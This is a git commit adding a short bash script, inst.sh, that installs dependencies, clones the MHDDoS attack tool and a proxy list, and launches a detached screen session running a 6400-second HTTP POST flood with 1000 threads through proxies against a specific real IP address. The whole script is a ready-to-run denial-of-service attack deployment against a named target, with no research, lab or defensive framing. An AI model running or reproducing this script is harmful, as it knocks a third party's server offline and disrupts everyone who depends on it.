36ff80d7e70cf3d1cac30e5cf3de3c8eca25e916
romen1w2 <58565305+romen1w2@users.noreply.github.com>
2023-08-07 03:36:43 +0200

    sh

---
+++ inst.sh
@@ -0,0 +1,19 @@
+#!/bin/bash
+
+sudo apt -y update
+
+sudo apt -y upgrade
+
+sudo apt -y install curl wget libcurl4 libssl-dev python3 python3-pip make cmake automake autoconf m4 build-essential nano htop screen
+
+git clone https://github.com/MatrixTM/MHDDoS.git
+
+git clone https://github.com/romen1w2/prox.git
+
+mv /root/prox/proxy.txt /root/MHDDoS/files/proxies/
+
+cd /root/MHDDoS/
+
+pip3 install -r requirements.txt
+
+screen -dm python3 start.py post http://88.198.48.45 5 1000 proxy.txt 100 6400
